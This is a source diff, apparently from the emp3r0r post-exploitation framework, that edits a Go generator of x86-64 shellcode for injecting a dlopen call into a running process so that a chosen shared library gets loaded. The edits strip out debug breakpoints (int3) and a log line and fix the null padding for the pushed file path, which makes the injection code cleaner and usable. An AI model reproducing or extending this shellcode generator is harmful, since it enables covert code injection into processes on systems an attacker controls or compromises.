@@ -19,10 +19,10 @@ var (
 		// movabs rdi, 0xdeadbeefdeadbeef; push rdi
 		// opcode is 48bfdeadbeefdeadbeef; 57
 		"filename" +
-		"cc" + // int3
+		// "cc" + // int3
 		"40b602" + // mov sil, 2; mode=2
 		"48b830d9320c047f0000" +
-		"cc" + // int3
+		// "cc" + // int3
 		"ffd0" + // movabs rax, 0x7f040c32d930; call rax
 		"cc" // int3
 	guardian_shellcode = emp3r0r_data.GuardianShellcode
@@ -50,8 +50,6 @@ func gen_dlopen_shellcode(path string, dlopen_addr int64) (shelcode string) {
 // generates instructions that pushes filename to stack
 // and assign to rdi as function parameter
 func push_filename_asm(path string) (ret_hex string) {
-	defer log.Printf("push_filename_hex: %s (%s)", ret_hex, path)
-
 	path_hex := ""
 	if len(path) <= 8 {
 		path_hex = hex.EncodeToString([]byte(path))
@@ -78,9 +76,9 @@ func push_filename_asm(path string) (ret_hex string) {
 
 	// pad the remaining bytes
 	if len(path_hex)/2 < 8 {
-		padding := 8 - len(path_hex)/2
-		padding_b := []byte{byte(padding)}
-		path_hex = fmt.Sprintf("%s%s", path_hex, strings.Repeat("00", padding))
+		padding := 8 - len(path_hex)/2     // number of paddings using NULL
+		padding_b := []byte{byte(padding)} // number of NULLs used for padding, in hex format
+		path_hex = fmt.Sprintf("%s%s", strings.Repeat("00", padding), path_hex)
 		ret_hex += "48bf" + path_hex + "57"
 		ret_hex += fmt.Sprintf("4883c4%s", hex.EncodeToString(padding_b)) // add rsp, padding
 	}
